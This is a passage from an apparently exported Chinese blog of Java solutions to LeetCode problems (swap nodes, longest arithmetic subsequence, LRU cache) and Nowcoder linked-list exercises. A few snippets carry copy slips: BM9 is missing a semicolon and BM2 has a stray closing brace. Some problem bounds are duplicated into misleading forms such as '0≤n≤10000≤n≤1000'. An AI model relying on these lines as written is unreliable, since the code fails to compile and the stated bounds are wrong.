class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; graph[i].length; j++) &#123;</span><br><span class="line">                new_graph.get(graph[i][j]).add(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 原数组记录的节点出度，在反图中就是入度</span></span><br><span class="line">            Indeg[i] = graph[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 拓扑排序</span></span><br><span class="line">        Queue&lt;Integer&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 首先将入度为 0 的点存入队列</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Indeg[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                q.offer(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 每次弹出队头元素</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> q.poll();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> x : new_graph.get(cur)) &#123;</span><br><span class="line">                <span class="comment">// 将以其为起点的有向边删除，更新终点入度</span></span><br><span class="line">                Indeg[x]--;</span><br><span class="line">                <span class="keyword">if</span>(Indeg[x] == <span class="number">0</span>) q.offer(x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最终入度（原图中出度）为 0 的所有点均为安全点</span></span><br><span class="line">        List&lt;Integer&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Indeg[i] == <span class="number">0</span>) ret.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="1721-交换链表中的节点"><a href="#1721-交换链表中的节点" class="headerlink" title="1721. 交换链表中的节点"></a><a href="https://leetcode.cn/problems/swapping-nodes-in-a-linked-list/">1721. 交换链表中的节点</a></h1><blockquote>
<p>给你链表的头节点 <code>head</code> 和一个整数 <code>k</code> 。</p>
<p><strong>交换</strong> 链表正数第 <code>k</code> 个节点和倒数第 <code>k</code> 个节点的值后，返回链表的头节点（链表 <strong>从 1 开始索引</strong>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,2,3,4,5], k = 2</span><br><span class="line">输出：[1,4,3,2,5]</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：值交换"><a href="#思路：值交换" class="headerlink" title="思路：值交换"></a>思路：值交换</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapNodes</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">left</span> <span class="operator">=</span> head;<span class="comment">// 第k个节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">right</span> <span class="operator">=</span> head;<span class="comment">// 倒数第k个节点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; k; i++)&#123;left = left.next;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            right = right.next;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 交换左右两个节点的值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> right.val;</span><br><span class="line">        right.val = left.val;</span><br><span class="line">        left.val = m;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="1027-最长等差数列"><a href="#1027-最长等差数列" class="headerlink" title="1027. 最长等差数列"></a><a href="https://leetcode.cn/problems/longest-arithmetic-subsequence/">1027. 最长等差数列</a></h1><blockquote>
<p>给你一个整数数组 nums，返回 nums 中最长等差子序列的长度。</p>
<p>回想一下，nums 的子序列是一个列表 nums[i1], nums[i2], …, nums[ik] ，且 0 &lt;&#x3D; i1 &lt; i2 &lt; … &lt; ik &lt;&#x3D; nums.length - 1。并且如果 seq[i+1] - seq[i]( 0 &lt;&#x3D; i &lt; seq.length - 1) 的值都相同，那么序列 seq 是等差的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,6,9,12]</span><br><span class="line">输出：4</span><br><span class="line">解释： </span><br><span class="line">整个数组是公差为 3 的等差数列</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：动态规划-1"><a href="#思路：动态规划-1" class="headerlink" title="思路：动态规划"></a>思路：动态规划</h2><p><a href="https://leetcode.cn/problems/longest-arithmetic-subsequence/solution/zui-chang-deng-chai-shu-lie-by-zai-jian-u21ci/">详解</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestArithSeqLength</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">  </span><br><span class="line">        <span class="type">int</span> n=nums.length;</span><br><span class="line">        <span class="type">int</span>[][] dp=<span class="keyword">new</span> <span class="title class_">int</span>[n][<span class="number">1001</span>];</span><br><span class="line">        <span class="type">int</span> maxLen=<span class="number">0</span>;<span class="comment">//保存结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;n;k++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;k;j++)&#123;</span><br><span class="line">                <span class="type">int</span> d=nums[k]-nums[j]+<span class="number">500</span>;<span class="comment">//统一加偏移量，使下标非负</span></span><br><span class="line">                dp[k][d]=dp[j][d]+<span class="number">1</span>; <span class="comment">//根据 d 去填充dp[k][d]</span></span><br><span class="line">                maxLen=Math.max(maxLen,dp[k][d]);<span class="comment">//维护最大值</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLen+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="146-LRU-缓存"><a href="#146-LRU-缓存" class="headerlink" title="146. LRU 缓存"></a><a href="https://leetcode.cn/problems/lru-cache/">146. LRU 缓存</a></h1><blockquote>
<p>请你设计并实现一个满足  LRU (最近最少使用) 缓存 约束的数据结构。<br>实现 LRUCache 类：<br>LRUCache(int capacity) 以 正整数 作为容量 capacity 初始化 LRU 缓存<br>int get(int key) 如果关键字 key 存在于缓存中，则返回关键字的值，否则返回 -1 。<br>void put(int key, int value) 如果关键字 key 已经存在，则变更其数据值 value ；如果不存在，则向缓存中插入该组 key-value 。如果插入操作导致关键字数量超过 capacity ，则应该 逐出 最久未使用的关键字。<br>函数 get 和 put 必须以 O(1) 的平均时间复杂度运行。</p>
</blockquote>
<h2 id="思路：双向哈希链表"><a href="#思路：双向哈希链表" class="headerlink" title="思路：双向哈希链表"></a>思路：双向哈希链表</h2><p>主要问题：为什么要用双向链表？如何更新新访问的值</p>
<p><a href="https://leetcode.cn/problems/lru-cache/solution/lru-ce-lue-xiang-jie-he-shi-xian-by-labuladong/">详细思路</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">    <span class="type">int</span> cap;</span><br><span class="line">    LinkedHashMap&lt;Integer, Integer&gt; cache = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123; </span><br><span class="line">        <span class="built_in">this</span>.cap = capacity;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cache.containsKey(key)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将 key 变为最近使用</span></span><br><span class="line">        makeRecently(key);</span><br><span class="line">        <span class="keyword">return</span> cache.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache.containsKey(key)) &#123;</span><br><span class="line">            <span class="comment">// 修改 key 的值</span></span><br><span class="line">            cache.put(key, val);</span><br><span class="line">            <span class="comment">// 将 key 变为最近使用</span></span><br><span class="line">            makeRecently(key);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (cache.size() &gt;= <span class="built_in">this</span>.cap) &#123;</span><br><span class="line">            <span class="comment">// 链表头部就是最久未使用的 key</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">oldestKey</span> <span class="operator">=</span> cache.keySet().iterator().next();</span><br><span class="line">            cache.remove(oldestKey);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将新的 key 添加链表尾部</span></span><br><span class="line">        cache.put(key, val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">makeRecently</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> cache.get(key);</span><br><span class="line">        <span class="comment">// 删除 key，重新插入到队尾</span></span><br><span class="line">        cache.remove(key);</span><br><span class="line">        cache.put(key, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>牛客必刷100题</title>
    <url>/2023/02/24/34-%E7%89%9B%E5%AE%A2%E5%BF%85%E5%88%B7100/</url>
    <content><![CDATA[<h1 id="一、链表"><a href="#一、链表" class="headerlink" title="一、链表"></a>一、链表</h1><h2 id="BM1-反转链表"><a href="#BM1-反转链表" class="headerlink" title="BM1 反转链表"></a><strong>BM1</strong> <strong>反转链表</strong></h2><blockquote>
<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>给定一个单链表的头结点pHead(该头节点是有值的，比如在下图，它的val是1)，长度为n，反转该链表后，返回新链表的表头。 </p>
<p>数据范围： 0≤n≤10000≤<em>n</em>≤1000</p>
<p>要求：空间复杂度 O(1)，时间复杂度 O(n)。</p>
</blockquote>
<h3 id="思路：迭代"><a href="#思路：迭代" class="headerlink" title="思路：迭代"></a>思路：迭代</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">ReverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curr</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(curr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> curr.next;</span><br><span class="line">            curr.next = prev;</span><br><span class="line">            prev = curr;</span><br><span class="line">            curr = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="BM2-链表内指定区间反转"><a href="#BM2-链表内指定区间反转" class="headerlink" title="BM2 链表内指定区间反转"></a><strong>BM2</strong> <strong>链表内指定区间反转</strong></h2><blockquote>
<p>将一个节点数为 size 链表 m 位置到 n 位置之间的区间反转，要求时间复杂度 O(n)<em>O</em>(<em>n</em>)，空间复杂度 O(1)<em>O</em>(1)。<br>例如：<br>给出的链表为 1→2→3→4→5→NULL1→2→3→4→5→<em>N<strong>U</strong>L**L</em>, m&#x3D;2,n&#x3D;4<em>m</em>&#x3D;2,<em>n</em>&#x3D;4,<br>返回 1→4→3→2→5→NULL1→4→3→2→5→<em>N<strong>U</strong>L**L</em>.</p>
</blockquote>
<h3 id="思路：一次遍历"><a href="#思路：一次遍历" class="headerlink" title="思路：一次遍历"></a>思路：一次遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseBetween</span> <span class="params">(ListNode head, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummyNode.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummyNode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; m-<span class="number">1</span> ; i++)&#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> pre.next;</span><br><span class="line">        ListNode cur_next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; n-m;i++)&#123;</span><br><span class="line">            cur_next = cur.next;</span><br><span class="line">            cur.next = cur_next.next;</span><br><span class="line">            cur_next.next = pre.next;</span><br><span class="line">            pre.next = cur_next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM3-链表中的节点每k个一组翻转"><a href="#BM3-链表中的节点每k个一组翻转" class="headerlink" title="BM3 链表中的节点每k个一组翻转"></a><strong>BM3</strong> <strong>链表中的节点每k个一组翻转</strong></h2><blockquote>
<p>将给出的链表中的节点每 k 个一组翻转，返回翻转后的链表<br>如果链表中的节点数不是 k 的倍数，将最后剩下的节点保持原样<br>你不能更改节点中的值，只能更改节点本身。 </p>
<p>数据范围： 0≤n≤2000 0≤<em>n</em>≤2000 ， 1≤k≤20001≤<em>k</em>≤2000 ，链表中每个元素都满足 0≤val≤10000≤<em>v<strong>a</strong>l</em>≤1000<br>要求空间复杂度 O(1)<em>O</em>(1)，时间复杂度 O(n)<em>O</em>(<em>n</em>)</p>
<p>例如： </p>
<p>给定的链表是 1→2→3→4→5</p>
<p>对于 k&#x3D;2, 你应该返回 2→1→4→3→5</p>
<p>对于 k&#x3D;3 , 你应该返回 3→2→1→4→5</p>
</blockquote>
<h3 id="思路：递归"><a href="#思路：递归" class="headerlink" title="思路：递归"></a>思路：递归</h3><p><img src="https://picgooo.oss-cn-hangzhou.aliyuncs.com/img/D024AA6BA7A670402678A9ACAD54EB10.gif"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span> <span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; k ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tail == <span class="literal">null</span>)    <span class="keyword">return</span> head;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != tail)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> cur.next;</span><br><span class="line">            cur.next  = pre;</span><br><span class="line">            pre =cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        head.next = reverseKGroup(tail,k);</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM4-合并两个排序的链表"><a href="#BM4-合并两个排序的链表" class="headerlink" title="BM4 合并两个排序的链表"></a><strong>BM4</strong> <strong>合并两个排序的链表</strong></h2><blockquote>
<p>输入两个递增的链表，单个链表的长度为n，合并这两个链表并使新链表中的节点仍然是递增排序的。</p>
<p>数据范围： 0≤n≤10000≤<em>n</em>≤1000，−1000≤节点值≤1000−1000≤节点值≤1000<br>要求：空间复杂度 O(1，时间复杂度 O(n)</p>
</blockquote>
<h3 id="思路：递归-1"><a href="#思路：递归-1" class="headerlink" title="思路：递归"></a>思路：递归</h3><p>这个题递归最容易理解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">Merge</span><span class="params">(ListNode list1,ListNode list2)</span> &#123;</span><br><span class="line">        <span class="comment">// list1 list2为空的情况</span></span><br><span class="line">        <span class="keyword">if</span>(list1 == <span class="literal">null</span> || list2 == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list1 != <span class="literal">null</span> ? list1 : list2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 两个链表元素依次对比</span></span><br><span class="line">        <span class="keyword">if</span>(list1.val &lt;= list2.val)&#123;</span><br><span class="line">            <span class="comment">// 递归计算 list1.next, list2</span></span><br><span class="line">            list1.next = Merge(list1.next, list2);</span><br><span class="line">            <span class="keyword">return</span> list1;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 递归计算 list1, list2.next</span></span><br><span class="line">            list2.next = Merge(list1, list2.next);</span><br><span class="line">            <span class="keyword">return</span> list2;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM6-判断链表中是否有环"><a href="#BM6-判断链表中是否有环" class="headerlink" title="BM6 判断链表中是否有环"></a><strong>BM6</strong> <strong>判断链表中是否有环</strong></h2><blockquote>
<p>判断给定的链表中是否有环。如果有环则返回true，否则返回false。</p>
<p>数据范围：链表长度 0≤n≤10000，链表中任意节点的值满足 ∣val∣&lt;&#x3D;100000</p>
</blockquote>
<h3 id="思路：快慢指针"><a href="#思路：快慢指针" class="headerlink" title="思路：快慢指针"></a>思路：快慢指针</h3><p>如果有回环，快慢指针肯定会相遇</p>
<p>时间复杂度：O（N）</p>
<p>空间复杂度：O（1）</p>
<p>还有一种思路：使用HashSet来存节点，看是否用重复的就行，但这种方法的空间复杂度是O（N）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//先判断链表为空的情况</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//快慢双指针</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head; </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//如果没环快指针会先到链表尾</span></span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123; </span><br><span class="line">            <span class="comment">//快指针移动两步</span></span><br><span class="line">            fast = fast.next.next; </span><br><span class="line">            <span class="comment">//慢指针移动一步</span></span><br><span class="line">            slow = slow.next; </span><br><span class="line">            <span class="comment">//相遇则有环</span></span><br><span class="line">            <span class="keyword">if</span>(fast == slow) </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//到末尾则没有环</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM7-链表中环的入口结点"><a href="#BM7-链表中环的入口结点" class="headerlink" title="BM7 链表中环的入口结点"></a><strong>BM7</strong> <strong>链表中环的入口结点</strong></h2><blockquote>
<p>给一个长度为n链表，若其中包含环，请找出该链表的环的入口结点，否则，返回null。 </p>
<p>数据范围： n≤10000，1&lt;&#x3D;结点值&lt;&#x3D;10000</p>
<p>要求：空间复杂度 O(1)，时间复杂度 O(n)</p>
</blockquote>
<h3 id="思路：快慢指针-1"><a href="#思路：快慢指针-1" class="headerlink" title="思路：快慢指针"></a>思路：快慢指针</h3><p>经典题目，主要在于数学推导部分。</p>
<p>可以直接背一下～</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head,fast = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span>(fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">                fast = fast.next.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(fast == slow )&#123;</span><br><span class="line">                <span class="type">ListNode</span> <span class="variable">ptr</span> <span class="operator">=</span> head;</span><br><span class="line">                <span class="keyword">while</span>(ptr != slow)&#123;</span><br><span class="line">                    ptr = ptr.next;</span><br><span class="line">                    slow = slow.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> ptr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM8-链表中倒数最后k个结点"><a href="#BM8-链表中倒数最后k个结点" class="headerlink" title="BM8 链表中倒数最后k个结点"></a><strong>BM8</strong> <strong>链表中倒数最后k个结点</strong></h2><blockquote>
<p>输入一个长度为 n 的链表，设链表中的元素的值为 ai ，返回该链表中倒数第k个节点。 </p>
<p>如果该链表长度小于k，请返回一个长度为 0 的链表。 </p>
<p>要求：空间复杂度 O(n)，时间复杂度 O(n)</p>
<p>进阶：空间复杂度 O(1)，时间复杂度 O(n)</p>
</blockquote>
<h3 id="思路：快慢指针-2"><a href="#思路：快慢指针-2" class="headerlink" title="思路：快慢指针"></a>思路：快慢指针</h3><p>要得到倒数第k个，就可以声明两个指针</p>
<p>第一个指针先走k步，然后两个指针再一起走，等到第一个指针为null的时候，第二个指针即为倒数第k个节点</p>
<p>时间复杂度：O（N）</p>
<p>空间复杂度：O（1）</p>
<p>第二种空间复杂度为O（N）的思路就是使用栈就行～</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">FindKthToTail</span> <span class="params">(ListNode pHead, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> pHead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> pHead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; k ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fast == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span>)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM9-删除链表的倒数第n个节点"><a href="#BM9-删除链表的倒数第n个节点" class="headerlink" title="BM9 删除链表的倒数第n个节点"></a><strong>BM9</strong> <strong>删除链表的倒数第n个节点</strong></h2><blockquote>
<p>给定一个链表，删除链表的倒数第 n 个节点并返回链表的头指针</p>
<p>例如， </p>
<p>给出的链表为: 1→2→3→4→5, n&#x3D;2<br>删除了链表的倒数第 n个节点之后,链表变为1→2→3→5</p>
<p>数据范围： 链表长度 0≤n≤1000，链表中任意节点的值满足 0≤val≤100</p>
<p>要求：空间复杂度 O(1)，时间复杂度 O(n)</p>
<p>备注： </p>
<p>题目保证 n 一定是有效的</p>
</blockquote>
<h3 id="思路：快慢指针-3"><a href="#思路：快慢指针-3" class="headerlink" title="思路：快慢指针"></a>思路：快慢指针</h3><p>要求空间复杂度为O（1）。因此和上题一样的思路，但是和上题找到倒数第k个节点不同的是，这里需要删除，所以应该找到倒数k+1个节点，然后将它的next指向到倒数第k-1个节点。</p>
<p>所以很简单的思路就是把slow指向head的前面一个哑节点，也俗称dummyHead，这样的话不会造成越界～</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span> <span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummyHead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span>dummyHead;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; n ; i++)&#123;</span><br><span class="line">            fast = fast.next</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span>)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        slow.next = slow.next.next;</span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="BM10-两个链表的第一个公共结点"><a href="#BM10-两个链表的第一个公共结点" class="headerlink" title="BM10 两个链表的第一个公共结点"></a><strong>BM10</strong> <strong>两个链表的第一个公共结点</strong></h2><blockquote>
<p>输入两个无环的单向链表，找出它们的第一个公共结点，如果没有公共节点则返回空。（注意因为传入数据是链表，所以错误测试数据的提示是用其他方式显示的，保证传入数据是正确的） </p>
<p>数据范围： n≤100<br>要求：空间复杂度 O(1)，时间复杂度 O(n)</p>
</blockquote>
<h3 id="思路：双指针"><a href="#思路：双指针" class="headerlink" title="思路：双指针"></a>思路：双指针</h3><p>很经典的一个题，很好理解。注意这里为什么判断条件是l1和l2是否相等，因为两个指针要么找到公共节点的时候相等，要么就是同时为null。</p>
<p><img src="https://uploadfiles.nowcoder.com/files/20210621/908787715_1624289962297/36.gif"></p>
